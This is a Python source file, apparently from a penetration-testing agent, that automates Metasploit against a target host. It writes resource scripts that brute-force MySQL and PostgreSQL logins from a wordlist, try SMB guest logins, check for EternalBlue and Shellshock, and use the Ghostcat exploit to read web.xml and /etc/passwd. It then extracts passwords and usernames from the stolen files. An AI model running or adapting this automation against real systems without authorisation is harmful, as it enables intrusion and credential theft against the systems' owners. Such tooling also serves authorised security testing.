from __future__ import annotations

import json
import os
import subprocess
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


def _get_passfile() -> str:
    from skoll_agent.config.wordlists import get_tool_wordlist
    return get_tool_wordlist("msfconsole")


class MsfconsoleEngine(BaseEngine):
    name = "msfconsole"
    description = "Metasploit automation via resource scripts. Escanea servicios con módulos auxiliares."
    capabilities = ["metasploit", "auxiliary_scan", "exploit_suggester"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        timeout_s = int(kwargs.get("timeout", 300))
        ports = kwargs.get("ports", [])
        services = kwargs.get("services", [])

        rc_lines = [
            "spool /tmp/msfconsole_output.txt",
            "db_status",
        ]

        # Agregar módulos según servicios detectados
        for svc in services:
            service = svc.get("service", "").lower()
            product = svc.get("product", "").lower()
            version = svc.get("version", "")
            port = svc.get("port", 0)

            if service in ("http", "https"):
                rc_lines.append(f"use auxiliary/scanner/http/http_version")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/http/title")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")
                if "apache" in product:
                    rc_lines.append("use auxiliary/scanner/http/apache_mod_cgi_bash_env")
                    rc_lines.append(f"set RHOSTS {target}")
                    if port:
                        rc_lines.append(f"set RPORT {port}")
                    rc_lines.append("run")

            elif service == "smb" or service in ("microsoft-ds", "netbios-ssn"):
                rc_lines.append("use auxiliary/scanner/smb/smb_version")
                rc_lines.append(f"set RHOSTS {target}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/smb/smb_enumshares")
                rc_lines.append(f"set RHOSTS {target}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/smb/smb_login")
                rc_lines.append(f"set RHOSTS {target}")
                rc_lines.append('set SMBUser guest')
                rc_lines.append('set SMBPass ""')
                rc_lines.append("run")
                # EternalBlue check
                rc_lines.append("use auxiliary/scanner/smb/smb_ms17_010")
                rc_lines.append(f"set RHOSTS {target}")
                rc_lines.append("run")

            elif service == "ftp":
                rc_lines.append("use auxiliary/scanner/ftp/ftp_version")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/ftp/anonymous")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")

            elif service == "ssh":
                rc_lines.append("use auxiliary/scanner/ssh/ssh_version")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")

            elif service == "mysql":
                rc_lines.append("use auxiliary/scanner/mysql/mysql_version")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/mysql/mysql_login")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append('set USERNAME root')
                rc_lines.append(f'set PASS_FILE {_get_passfile()}')
                rc_lines.append("set STOP_ON_SUCCESS true")
                rc_lines.append("run")

            elif service == "postgresql" or service == "postgres":
                rc_lines.append("use auxiliary/scanner/postgres/postgres_version")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append("run")
                rc_lines.append("use auxiliary/scanner/postgres/postgres_login")
                rc_lines.append(f"set RHOSTS {target}")
                if port:
                    rc_lines.append(f"set RPORT {port}")
                rc_lines.append('set USERNAME postgres')
                rc_lines.append(f'set PASS_FILE {_get_passfile()}')
                rc_lines.append("set STOP_ON_SUCCESS true")
                rc_lines.append("run")

            elif service in ("ajp13", "tomcat"):
                rc_lines.append("use auxiliary/admin/http/tomcat_ghostcat")
                rc_lines.append(f"set RHOSTS {target}")
                rc_lines.append(f"set RPORT {port if port else 8009}")
                rc_lines.append("set FILENAME /WEB-INF/web.xml")
                rc_lines.append("run")
                rc_lines.append("set FILENAME /etc/passwd")
                rc_lines.append("run")

        rc_lines.append("spool off")
        rc_lines.append("exit")

        rc_content = "\n".join(rc_lines)
        rc_path = "/tmp/msfconsole_skoll.rc"
        try:
            with open(rc_path, "w") as f:
                f.write(rc_content)
        except Exception as e:
            return EngineResult(success=False, raw_output="", summary=f"msfconsole: {e}", error=str(e))

        args = ["msfconsole", "-q", "-r", rc_path]
        try:
            result = subprocess.run(
                args, capture_output=True, text=True,
                timeout=timeout_s,
            )
            raw = result.stdout + result.stderr

            # También leer output del spool
            spool_path = "/tmp/msfconsole_output.txt"
            if os.path.exists(spool_path):
                try:
                    with open(spool_path) as f:
                        spool = f.read()
                    raw += "\n=== SPOOL ===\n" + spool
                except Exception:
                    pass

            findings = self._parse_msf_output(raw, target)

            # Ghostcat: read loot files from disk
            import re as _re
            for m in _re.finditer(r"File contents save to:\s*(\S+)", raw):
                loot_path = m.group(1)
                if os.path.exists(loot_path) and os.path.getsize(loot_path) > 0:
                    try:
                        with open(loot_path) as lf:
                            content = lf.read()
                        findings.append({
                            "file_path": loot_path, "line_start": 0, "line_end": 0,
                            "severity": "critical",
                            "title": f"Ghostcat: {os.path.basename(loot_path).replace('_','/').split('.txt')[0]}",
                            "description": f"Read via CVE-2020-1938 ({len(content)} bytes):\n{content[:2000]}",
                            "tool": self.name,
                            "rule_id": "ghostcat-loot",
                            "cve_id": "CVE-2020-1938",
                            "content": content,
                            "loot_path": loot_path,
                        })
                        self._detect_creds_in_content(content, findings)
                    except Exception:
                        pass
            summary = f"msfconsole: {len(findings)} findings, {len(services)} services scanned"
            return EngineResult(
                success=True, raw_output=raw,
                findings=findings, summary=summary,
            )
        except subprocess.TimeoutExpired:
            return EngineResult(success=False, raw_output="", summary="msfconsole: timeout", error="Timeout")
        except FileNotFoundError:
            return EngineResult(success=False, raw_output="", summary="msfconsole: not installed", error="Install metasploit-framework")
        except Exception as e:
            return EngineResult(success=False, raw_output="", summary=f"msfconsole: {e}", error=str(e))

    def _parse_msf_output(self, raw: str, target: str) -> list[dict[str, Any]]:
        import re
        findings = []
        lines = raw.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i]

            # Ghostcat (tomcat_ghostcat auxiliary module) — match loot save, ignore "Unable to read"
            if "File contents save to" in line and "ghostcat" not in line.lower():
                pass  # handled above in scan() via regex

            # SMB MS17-010
            if "ms17_010" in line.lower() and "vulnerable" in line.lower():
                findings.append({
                    "file_path": "", "line_start": i, "line_end": i,
                    "severity": "critical",
                    "title": "MS17-010 (EternalBlue) vulnerable",
                    "description": f"SMB on {target} is vulnerable to MS17-010 EternalBlue",
                    "tool": self.name,
                    "rule_id": "ms17-010",
                    "recommendation": "Apply MS17-010 patch immediately",
                })

            # FTP anonymous
            if "anonymous" in line.lower() and ("allowed" in line.lower() or "yes" in line.lower()):
                findings.append({
                    "file_path": "", "line_start": i, "line_end": i,
                    "severity": "high",
                    "title": "FTP anonymous login allowed",
                    "description": line.strip()[:200],
                    "tool": self.name,
                    "rule_id": "ftp-anonymous",
                    "recommendation": "Disable anonymous FTP access",
                })

            # MySQL login success
            if "+" in line and "Success" in line and "mysql" in line.lower():
                findings.append({
                    "file_path": "", "line_start": i, "line_end": i,
                    "severity": "critical",
                    "title": f"MySQL login success: {line.strip()}",
                    "description": line.strip()[:200],
                    "tool": self.name,
                    "rule_id": "mysql-login",
                })

            # Postgres login success
            if "+" in line and "Success" in line and "postgres" in line.lower():
                findings.append({
                    "file_path": "", "line_start": i, "line_end": i,
                    "severity": "critical",
                    "title": f"PostgreSQL login success: {line.strip()}",
                    "description": line.strip()[:200],
                    "tool": self.name,
                    "rule_id": "postgres-login",
                })

            # SMB login success
            if "+" in line and "Success" in line and "smb" in line.lower():
                findings.append({
                    "file_path": "", "line_start": i, "line_end": i,
                    "severity": "critical",
                    "title": f"SMB login success: {line.strip()}",
                    "description": line.strip()[:200],
                    "tool": self.name,
                    "rule_id": "smb-login",
                })

            # Shellshock (apache_mod_cgi_bash_env)
            if "shellshock" in line.lower() or "bash_env" in line.lower():
                if "vulnerable" in line.lower() or "exploitable" in line.lower():
                    findings.append({
                        "file_path": "", "line_start": i, "line_end": i,
                        "severity": "critical",
                        "title": "Shellshock (CVE-2014-6271) vulnerable",
                        "description": line.strip()[:200],
                        "tool": self.name,
                        "rule_id": "shellshock",
                    })

            i += 1

        return findings

    @staticmethod
    def _detect_creds_in_content(content: str, findings: list[dict]) -> None:
        import re
        # passwords
        for m in re.finditer(r'(?:password|passwd|pwd)[=:\s]\s*(\S+)', content, re.IGNORECASE):
            val = m.group(1).strip("\"'")
            if len(val) > 3 and val not in ("true", "false", "yes", "no"):
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "critical",
                    "title": f"Credential found: password={val}",
                    "description": f"Password discovered in Ghostcat file read",
                    "tool": "msfconsole",
                    "rule_id": "ghostcat-cred-password",
                    "password": val,
                })
        # usernames
        for m in re.finditer(r'(?:username|user|login)[=:\s]\s*(\S+)', content, re.IGNORECASE):
            val = m.group(1).strip("\"'")
            if len(val) > 2:
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "high",
                    "title": f"Username found: {val}",
                    "description": f"Username discovered in Ghostcat file read",
                    "tool": "msfconsole",
                    "rule_id": "ghostcat-cred-username",
                    "username": val,
                })
        # Tomcat roles/users
        for m in re.finditer(r'<user\s+(?:\w+="[^"]*"\s+)*username="([^"]*)"\s+password="([^"]*)"', content, re.IGNORECASE):
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "critical",
                "title": f"Tomcat credentials: {m.group(1)}:{m.group(2)}",
                "description": f"Tomcat user found: {m.group(1)} / {m.group(2)}",
                "tool": "msfconsole",
                "rule_id": "ghostcat-tomcat-creds",
                "username": m.group(1),
                "password": m.group(2),
            })

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
